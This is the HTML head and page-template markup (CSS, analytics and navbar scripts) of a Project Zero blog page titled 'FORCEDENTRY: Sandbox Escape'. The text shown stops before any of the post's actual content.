<!DOCTYPE html>
<html class='v2' dir='ltr' lang='en' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
<link href='https://www.blogger.com/static/v1/widgets/3566091532-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
<meta content='width=1100' name='viewport'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<link href='https://googleprojectzero.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
<link href='https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="Project Zero - Atom" href="https://googleprojectzero.blogspot.com/feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="Project Zero - RSS" href="https://googleprojectzero.blogspot.com/feeds/posts/default?alt=rss" />
<link rel="service.post" type="application/atom+xml" title="Project Zero - Atom" href="https://draft.blogger.com/feeds/4838136820032157985/posts/default" />

<link rel="alternate" type="application/atom+xml" title="Project Zero - Atom" href="https://googleprojectzero.blogspot.com/feeds/1353264177358891846/comments/default" />
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<link href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1200/image1%286%29.png' rel='image_src'/>
<meta content='https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html' property='og:url'/>
<meta content='FORCEDENTRY: Sandbox Escape' property='og:title'/>
<meta content='  Posted by Ian Beer &amp; Samuel Groß  of Google Project Zero     We want to thank Citizen Lab for sharing a sample of the FORCEDENTRY exploit ...' property='og:description'/>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/w1200-h630-p-k-no-nu/image1%286%29.png' property='og:image'/>
<title>Project Zero: FORCEDENTRY: Sandbox Escape</title>
<style type='text/css'>@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4taVIGxA.woff2)format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4kaVIGxA.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4saVIGxA.woff2)format('woff2');unicode-range:U+1F00-1FFF;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4jaVIGxA.woff2)format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4iaVIGxA.woff2)format('woff2');unicode-range:U+0307-0308,U+0590-05FF,U+200C-2010,U+20AA,U+25CC,U+FB1D-FB4F;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B5caVIGxA.woff2)format('woff2');unicode-range:U+0302-0303,U+0305,U+0307-0308,U+0310,U+0312,U+0315,U+031A,U+0326-0327,U+032C,U+032F-0330,U+0332-0333,U+0338,U+033A,U+0346,U+034D,U+0391-03A1,U+03A3-03A9,U+03B1-03C9,U+03D1,U+03D5-03D6,U+03F0-03F1,U+03F4-03F5,U+2016-2017,U+2034-2038,U+203C,U+2040,U+2043,U+2047,U+2050,U+2057,U+205F,U+2070-2071,U+2074-208E,U+2090-209C,U+20D0-20DC,U+20E1,U+20E5-20EF,U+2100-2112,U+2114-2115,U+2117-2121,U+2123-214F,U+2190,U+2192,U+2194-21AE,U+21B0-21E5,U+21F1-21F2,U+21F4-2211,U+2213-2214,U+2216-22FF,U+2308-230B,U+2310,U+2319,U+231C-2321,U+2336-237A,U+237C,U+2395,U+239B-23B7,U+23D0,U+23DC-23E1,U+2474-2475,U+25AF,U+25B3,U+25B7,U+25BD,U+25C1,U+25CA,U+25CC,U+25FB,U+266D-266F,U+27C0-27FF,U+2900-2AFF,U+2B0E-2B11,U+2B30-2B4C,U+2BFE,U+3030,U+FF5B,U+FF5D,U+1D400-1D7FF,U+1EE00-1EEFF;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B5OaVIGxA.woff2)format('woff2');unicode-range:U+0001-000C,U+000E-001F,U+007F-009F,U+20DD-20E0,U+20E2-20E4,U+2150-218F,U+2190,U+2192,U+2194-2199,U+21AF,U+21E6-21F0,U+21F3,U+2218-2219,U+2299,U+22C4-22C6,U+2300-243F,U+2440-244A,U+2460-24FF,U+25A0-27BF,U+2800-28FF,U+2921-2922,U+2981,U+29BF,U+29EB,U+2B00-2BFF,U+4DC0-4DFF,U+FFF9-FFFB,U+10140-1018E,U+10190-1019C,U+101A0,U+101D0-101FD,U+102E0-102FB,U+10E60-10E7E,U+1D2C0-1D2D3,U+1D2E0-1D37F,U+1F000-1F0FF,U+1F100-1F1AD,U+1F1E6-1F1FF,U+1F30D-1F30F,U+1F315,U+1F31C,U+1F31E,U+1F320-1F32C,U+1F336,U+1F378,U+1F37D,U+1F382,U+1F393-1F39F,U+1F3A7-1F3A8,U+1F3AC-1F3AF,U+1F3C2,U+1F3C4-1F3C6,U+1F3CA-1F3CE,U+1F3D4-1F3E0,U+1F3ED,U+1F3F1-1F3F3,U+1F3F5-1F3F7,U+1F408,U+1F415,U+1F41F,U+1F426,U+1F43F,U+1F441-1F442,U+1F444,U+1F446-1F449,U+1F44C-1F44E,U+1F453,U+1F46A,U+1F47D,U+1F4A3,U+1F4B0,U+1F4B3,U+1F4B9,U+1F4BB,U+1F4BF,U+1F4C8-1F4CB,U+1F4D6,U+1F4DA,U+1F4DF,U+1F4E3-1F4E6,U+1F4EA-1F4ED,U+1F4F7,U+1F4F9-1F4FB,U+1F4FD-1F4FE,U+1F503,U+1F507-1F50B,U+1F50D,U+1F512-1F513,U+1F53E-1F54A,U+1F54F-1F5FA,U+1F610,U+1F650-1F67F,U+1F687,U+1F68D,U+1F691,U+1F694,U+1F698,U+1F6AD,U+1F6B2,U+1F6B9-1F6BA,U+1F6BC,U+1F6C6-1F6CF,U+1F6D3-1F6D7,U+1F6E0-1F6EA,U+1F6F0-1F6F3,U+1F6F7-1F6FC,U+1F700-1F7FF,U+1F800-1F80B,U+1F810-1F847,U+1F850-1F859,U+1F860-1F887,U+1F890-1F8AD,U+1F8B0-1F8BB,U+1F8C0-1F8C1,U+1F900-1F90B,U+1F93B,U+1F946,U+1F984,U+1F996,U+1F9E9,U+1FA00-1FA6F,U+1FA70-1FA7C,U+1FA80-1FA89,U+1FA8F-1FAC6,U+1FACE-1FADC,U+1FADF-1FAE9,U+1FAF0-1FAF8,U+1FB00-1FBFF;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4vaVIGxA.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4uaVIGxA.woff2)format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Open Sans';font-style:normal;font-weight:400;font-stretch:100%;font-display:swap;src:url(//fonts.gstatic.com/s/opensans/v40/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4gaVI.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}</style>
<style id='page-skin-1' type='text/css'><!--
/*
-----------------------------------------------
Blogger Template Style
Name:     Simple
Designer: Blogger
URL:      www.blogger.com
----------------------------------------------- */
/* Variable definitions
====================
<Variable name="keycolor" description="Main Color" type="color" default="#66bbdd"/>
<Group description="Page Text" selector="body">
<Variable name="body.font" description="Font" type="font"
default="normal normal 12px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="body.text.color" description="Text Color" type="color" default="#222222"/>
</Group>
<Group description="Backgrounds" selector=".body-fauxcolumns-outer">
<Variable name="body.background.color" description="Outer Background" type="color" default="#66bbdd"/>
<Variable name="content.background.color" description="Main Background" type="color" default="#ffffff"/>
<Variable name="header.background.color" description="Header Background" type="color" default="transparent"/>
</Group>
<Group description="Links" selector=".main-outer">
<Variable name="link.color" description="Link Color" type="color" default="#2288bb"/>
<Variable name="link.visited.color" description="Visited Color" type="color" default="#888888"/>
<Variable name="link.hover.color" description="Hover Color" type="color" default="#33aaff"/>
</Group>
<Group description="Blog Title" selector=".header h1">
<Variable name="header.font" description="Font" type="font"
default="normal normal 60px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="header.text.color" description="Title Color" type="color" default="#3399bb" />
</Group>
<Group description="Blog Description" selector=".header .description">
<Variable name="description.text.color" description="Description Color" type="color"
default="#777777" />
</Group>
<Group description="Tabs Text" selector=".tabs-inner .widget li a">
<Variable name="tabs.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="tabs.text.color" description="Text Color" type="color" default="#999999"/>
<Variable name="tabs.selected.text.color" description="Selected Color" type="color" default="#000000"/>
</Group>
<Group description="Tabs Background" selector=".tabs-outer .PageList">
<Variable name="tabs.background.color" description="Background Color" type="color" default="#f5f5f5"/>
<Variable name="tabs.selected.background.color" description="Selected Color" type="color" default="#eeeeee"/>
</Group>
<Group description="Post Title" selector="h3.post-title, .comments h4">
<Variable name="post.title.font" description="Font" type="font"
default="normal normal 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
</Group>
<Group description="Date Header" selector=".date-header">
<Variable name="date.header.color" description="Text Color" type="color"
default="#000000"/>
<Variable name="date.header.background.color" description="Background Color" type="color"
default="transparent"/>
<Variable name="date.header.font" description="Text Font" type="font"
default="normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="date.header.padding" description="Date Header Padding" type="string" default="inherit"/>
<Variable name="date.header.letterspacing" description="Date Header Letter Spacing" type="string" default="inherit"/>
<Variable name="date.header.margin" description="Date Header Margin" type="string" default="inherit"/>
</Group>
<Group description="Post Footer" selector=".post-footer">
<Variable name="post.footer.text.color" description="Text Color" type="color" default="#666666"/>
<Variable name="post.footer.background.color" description="Background Color" type="color"
default="#f9f9f9"/>
<Variable name="post.footer.border.color" description="Shadow Color" type="color" default="#eeeeee"/>
</Group>
<Group description="Gadgets" selector="h2">
<Variable name="widget.title.font" description="Title Font" type="font"
default="normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.title.text.color" description="Title Color" type="color" default="#000000"/>
<Variable name="widget.alternate.text.color" description="Alternate Color" type="color" default="#999999"/>
</Group>
<Group description="Images" selector=".main-inner">
<Variable name="image.background.color" description="Background Color" type="color" default="#ffffff"/>
<Variable name="image.border.color" description="Border Color" type="color" default="#eeeeee"/>
<Variable name="image.text.color" description="Caption Text Color" type="color" default="#000000"/>
</Group>
<Group description="Accents" selector=".content-inner">
<Variable name="body.rule.color" description="Separator Line Color" type="color" default="#eeeeee"/>
<Variable name="tabs.border.color" description="Tabs Border Color" type="color" default="transparent"/>
</Group>
<Variable name="body.background" description="Body Background" type="background"
color="#eeeeee" default="$(color) none repeat scroll top left"/>
<Variable name="body.background.override" description="Body Background Override" type="string" default=""/>
<Variable name="body.background.gradient.cap" description="Body Gradient Cap" type="url"
default="url(https://resources.blogblog.com/blogblog/data/1kt/simple/gradients_light.png)"/>
<Variable name="body.background.gradient.tile" description="Body Gradient Tile" type="url"
default="url(https://resources.blogblog.com/blogblog/data/1kt/simple/body_gradient_tile_light.png)"/>
<Variable name="content.background.color.selector" description="Content Background Color Selector" type="string" default=".content-inner"/>
<Variable name="content.padding" description="Content Padding" type="length" default="10px" min="0" max="100px"/>
<Variable name="content.padding.horizontal" description="Content Horizontal Padding" type="length" default="10px" min="0" max="100px"/>
<Variable name="content.shadow.spread" description="Content Shadow Spread" type="length" default="40px" min="0" max="100px"/>
<Variable name="content.shadow.spread.webkit" description="Content Shadow Spread (WebKit)" type="length" default="5px" min="0" max="100px"/>
<Variable name="content.shadow.spread.ie" description="Content Shadow Spread (IE)" type="length" default="10px" min="0" max="100px"/>
<Variable name="main.border.width" description="Main Border Width" type="length" default="0" min="0" max="10px"/>
<Variable name="header.background.gradient" description="Header Gradient" type="url" default="none"/>
<Variable name="header.shadow.offset.left" description="Header Shadow Offset Left" type="length" default="-1px" min="-50px" max="50px"/>
<Variable name="header.shadow.offset.top" description="Header Shadow Offset Top" type="length" default="-1px" min="-50px" max="50px"/>
<Variable name="header.shadow.spread" description="Header Shadow Spread" type="length" default="1px" min="0" max="100px"/>
<Variable name="header.padding" description="Header Padding" type="length" default="30px" min="0" max="100px"/>
<Variable name="header.border.size" description="Header Border Size" type="length" default="1px" min="0" max="10px"/>
<Variable name="header.bottom.border.size" description="Header Bottom Border Size" type="length" default="1px" min="0" max="10px"/>
<Variable name="header.border.horizontalsize" description="Header Horizontal Border Size" type="length" default="0" min="0" max="10px"/>
<Variable name="description.text.size" description="Description Text Size" type="string" default="140%"/>
<Variable name="tabs.margin.top" description="Tabs Margin Top" type="length" default="0" min="0" max="100px"/>
<Variable name="tabs.margin.side" description="Tabs Side Margin" type="length" default="30px" min="0" max="100px"/>
<Variable name="tabs.background.gradient" description="Tabs Background Gradient" type="url"
default="url(https://resources.blogblog.com/blogblog/data/1kt/simple/gradients_light.png)"/>
<Variable name="tabs.border.width" description="Tabs Border Width" type="length" default="1px" min="0" max="10px"/>
<Variable name="tabs.bevel.border.width" description="Tabs Bevel Border Width" type="length" default="1px" min="0" max="10px"/>
<Variable name="post.margin.bottom" description="Post Bottom Margin" type="length" default="25px" min="0" max="100px"/>
<Variable name="image.border.small.size" description="Image Border Small Size" type="length" default="2px" min="0" max="10px"/>
<Variable name="image.border.large.size" description="Image Border Large Size" type="length" default="5px" min="0" max="10px"/>
<Variable name="page.width.selector" description="Page Width Selector" type="string" default=".region-inner"/>
<Variable name="page.width" description="Page Width" type="string" default="auto"/>
<Variable name="main.section.margin" description="Main Section Margin" type="length" default="15px" min="0" max="100px"/>
<Variable name="main.padding" description="Main Padding" type="length" default="15px" min="0" max="100px"/>
<Variable name="main.padding.top" description="Main Padding Top" type="length" default="30px" min="0" max="100px"/>
<Variable name="main.padding.bottom" description="Main Padding Bottom" type="length" default="30px" min="0" max="100px"/>
<Variable name="paging.background"
color="#ffffff"
description="Background of blog paging area" type="background"
default="transparent none no-repeat scroll top center"/>
<Variable name="footer.bevel" description="Bevel border length of footer" type="length" default="0" min="0" max="10px"/>
<Variable name="mobile.background.overlay" description="Mobile Background Overlay" type="string"
default="transparent none repeat scroll top left"/>
<Variable name="mobile.background.size" description="Mobile Background Size" type="string" default="auto"/>
<Variable name="mobile.button.color" description="Mobile Button Color" type="color" default="#ffffff" />
<Variable name="startSide" description="Side where text starts in blog language" type="automatic" default="left"/>
<Variable name="endSide" description="Side where text ends in blog language" type="automatic" default="right"/>
*/
/* Content
----------------------------------------------- */
body {
font: normal normal 12px Open Sans;
color: #000000;
background: #eeeeee none repeat scroll top left;
padding: 0 0 0 0;
}
html body .region-inner {
min-width: 0;
max-width: 100%;
width: auto;
}
h2 {
font-size: 22px;
}
a:link {
text-decoration:none;
color: #2288bb;
}
a:visited {
text-decoration:none;
color: #888888;
}
a:hover {
text-decoration:underline;
color: #33aaff;
}
.body-fauxcolumn-outer .fauxcolumn-inner {
background: transparent none repeat scroll top left;
_background-image: none;
}
.body-fauxcolumn-outer .cap-top {
position: absolute;
z-index: 1;
height: 400px;
width: 100%;
}
.body-fauxcolumn-outer .cap-top .cap-left {
width: 100%;
background: transparent none repeat-x scroll top left;
_background-image: none;
}
.content-outer {
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 #333333;
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
margin-bottom: 1px;
}
.content-inner {
padding: 10px 40px;
}
.content-inner {
background-color: #ffffff;
}
/* Header
----------------------------------------------- */
.header-outer {
background: transparent none repeat-x scroll 0 -400px;
_background-image: none;
}
.Header h1 {
font: normal normal 40px Open Sans;
color: #000000;
text-shadow: 0 0 0 rgba(0, 0, 0, .2);
}
.Header h1 a {
color: #000000;
}
.Header .description {
font-size: 18px;
color: #000000;
}
.header-inner .Header .titlewrapper {
padding: 22px 0;
}
.header-inner .Header .descriptionwrapper {
padding: 0 0;
}
/* Tabs
----------------------------------------------- */
.tabs-inner .section:first-child {
border-top: 0 solid #dddddd;
}
.tabs-inner .section:first-child ul {
margin-top: -1px;
border-top: 1px solid #dddddd;
border-left: 1px solid #dddddd;
border-right: 1px solid #dddddd;
}
.tabs-inner .widget ul {
background: transparent none repeat-x scroll 0 -800px;
_background-image: none;
border-bottom: 1px solid #dddddd;
margin-top: 0;
margin-left: -30px;
margin-right: -30px;
}
.tabs-inner .widget li a {
display: inline-block;
padding: .6em 1em;
font: normal normal 12px Open Sans;
color: #000000;
border-left: 1px solid #ffffff;
border-right: 1px solid #dddddd;
}
.tabs-inner .widget li:first-child a {
border-left: none;
}
.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
color: #000000;
background-color: #eeeeee;
text-decoration: none;
}
/* Columns
----------------------------------------------- */
.main-outer {
border-top: 0 solid transparent;
}
.fauxcolumn-left-outer .fauxcolumn-inner {
border-right: 1px solid transparent;
}
.fauxcolumn-right-outer .fauxcolumn-inner {
border-left: 1px solid transparent;
}
/* Headings
----------------------------------------------- */
div.widget > h2,
div.widget h2.title {
margin: 0 0 1em 0;
font: normal bold 11px 'Trebuchet MS',Trebuchet,Verdana,sans-serif;
color: #000000;
}
/* Widgets
----------------------------------------------- */
.widget .zippy {
color: #999999;
text-shadow: 2px 2px 1px rgba(0, 0, 0, .1);
}
.widget .popular-posts ul {
list-style: none;
}
/* Posts
----------------------------------------------- */
h2.date-header {
font: normal bold 11px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
}
.date-header span {
background-color: #bbbbbb;
color: #ffffff;
padding: 0.4em;
letter-spacing: 3px;
margin: inherit;
}
.main-inner {
padding-top: 35px;
padding-bottom: 65px;
}
.main-inner .column-center-inner {
padding: 0 0;
}
.main-inner .column-center-inner .section {
margin: 0 1em;
}
.post {
margin: 0 0 45px 0;
}
h3.post-title, .comments h4 {
font: normal normal 22px Open Sans;
margin: .75em 0 0;
}
.post-body {
font-size: 110%;
line-height: 1.4;
position: relative;
}
.post-body img, .post-body .tr-caption-container, .Profile img, .Image img,
.BlogList .item-thumbnail img {
padding: 2px;
background: #ffffff;
border: 1px solid #eeeeee;
-moz-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
-webkit-box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
box-shadow: 1px 1px 5px rgba(0, 0, 0, .1);
}
.post-body img, .post-body .tr-caption-container {
padding: 5px;
}
.post-body .tr-caption-container {
color: #666666;
}
.post-body .tr-caption-container img {
padding: 0;
background: transparent;
border: none;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .1);
box-shadow: 0 0 0 rgba(0, 0, 0, .1);
}
.post-header {
margin: 0 0 1.5em;
line-height: 1.6;
font-size: 90%;
}
.post-footer {
margin: 20px -2px 0;
padding: 5px 10px;
color: #666666;
background-color: #eeeeee;
border-bottom: 1px solid #eeeeee;
line-height: 1.6;
font-size: 90%;
}
#comments .comment-author {
padding-top: 1.5em;
border-top: 1px solid transparent;
background-position: 0 1.5em;
}
#comments .comment-author:first-child {
padding-top: 0;
border-top: none;
}
.avatar-image-container {
margin: .2em 0 0;
}
#comments .avatar-image-container img {
border: 1px solid #eeeeee;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #999999;
border-bottom: 1px solid #999999;
}
.comments .comment-thread.inline-thread {
background-color: #eeeeee;
}
.comments .continue {
border-top: 2px solid #999999;
}
/* Accents
---------------------------------------------- */
.section-columns td.columns-cell {
border-left: 1px solid transparent;
}
.blog-pager {
background: transparent url(//www.blogblog.com/1kt/simple/paging_dot.png) repeat-x scroll top center;
}
.blog-pager-older-link, .home-link,
.blog-pager-newer-link {
background-color: #ffffff;
padding: 5px;
}
.footer-outer {
border-top: 1px dashed #bbbbbb;
}
/* Mobile
----------------------------------------------- */
body.mobile  {
background-size: auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
.mobile .body-fauxcolumn-outer .cap-top {
background-size: 100% auto;
}
.mobile .content-outer {
-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
box-shadow: 0 0 3px rgba(0, 0, 0, .15);
}
.mobile .tabs-inner .widget ul {
margin-left: 0;
margin-right: 0;
}
.mobile .post {
margin: 0;
}
.mobile .main-inner .column-center-inner .section {
margin: 0;
}
.mobile .date-header span {
padding: 0.1em 10px;
margin: 0 -10px;
}
.mobile h3.post-title {
margin: 0;
}
.mobile .blog-pager {
background: transparent none no-repeat scroll top center;
}
.mobile .footer-outer {
border-top: none;
}
.mobile .main-inner, .mobile .footer-inner {
background-color: #ffffff;
}
.mobile-index-contents {
color: #000000;
}
.mobile-link-button {
background-color: #2288bb;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile .tabs-inner .section:first-child {
border-top: none;
}
.mobile .tabs-inner .PageList .widget-content {
background-color: #eeeeee;
color: #000000;
border-top: 1px solid #dddddd;
border-bottom: 1px solid #dddddd;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #dddddd;
}

--></style>
<style id='template-skin-1' type='text/css'><!--
body {
min-width: 1120px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 1120px;
max-width: 1120px;
_width: 1120px;
}
.main-inner .columns {
padding-left: 0;
padding-right: 310px;
}
.main-inner .fauxcolumn-center-outer {
left: 0;
right: 310px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0") -
parseInt("310px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0;
}
.main-inner .fauxcolumn-right-outer {
width: 310px;
}
.main-inner .column-left-outer {
width: 0;
right: 100%;
margin-left: -0;
}
.main-inner .column-right-outer {
width: 310px;
margin-right: -310px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
body#layout div.add_widget {
padding: 8px;
}
body#layout div.add_widget a {
margin-left: 32px;
}
--></style>
<script type='text/javascript'>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-240546891-1', 'auto', 'blogger');
        ga('blogger.send', 'pageview');
      </script>
<link href='https://draft.blogger.com/dyn-css/authorization.css?targetBlogID=4838136820032157985&amp;zx=1811180a-964f-4ff7-9cfd-eb7a1dbd453e' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://draft.blogger.com/dyn-css/authorization.css?targetBlogID=4838136820032157985&amp;zx=1811180a-964f-4ff7-9cfd-eb7a1dbd453e' rel='stylesheet'/></noscript>
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>

</head>
<body class='loading'>
<div class='navbar section' id='navbar' name='Navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
    function setAttributeOnload(object, attribute, val) {
      if(window.addEventListener) {
        window.addEventListener('load',
          function(){ object[attribute] = val; }, false);
      } else {
        window.attachEvent('onload', function(){ object[attribute] = val; });
      }
    }
  </script>
<div id="navbar-iframe-container"></div>
<script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
<script type="text/javascript">
      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
        if (gapi.iframes && gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: 'https://draft.blogger.com/navbar.g?targetBlogID\x3d4838136820032157985\x26blogName\x3dProject+Zero\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://googleprojectzero.blogspot.com/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttps://googleprojectzero.blogspot.com/\x26targetPostID\x3d1353264177358891846\x26blogPostOrPageUrl\x3dhttps://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html\x26vt\x3d1069635197800622518',
              where: document.getElementById("navbar-iframe-container"),
              id: "navbar-iframe",
              messageHandlersFilter: gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER,
              messageHandlers: {
                'blogger-ping': function() {}
              }
          });
        }
      });
    </script><script type="text/javascript">
(function() {
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
var head = document.getElementsByTagName('head')[0];
if (head) {
head.appendChild(script);
}})();
</script>
</div></div>
<div class='body-fauxcolumns'>
<div class='fauxcolumn-outer body-fauxcolumn-outer'>
<div class='cap-top'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
<div class='fauxborder-left'>
<div class='fauxborder-right'></div>
<div class='fauxcolumn-inner'>
</div>
</div>
<div class='cap-bottom'>
<div class='cap-left'></div>
<div class='cap-right'></div>
</div>
</div>
</div>
<div class='content'>
<div class='content-fauxcolumns'>
<div class='fauxcolumn-outer content-fauxcolumn-outer'>
<div class='cap-top'>
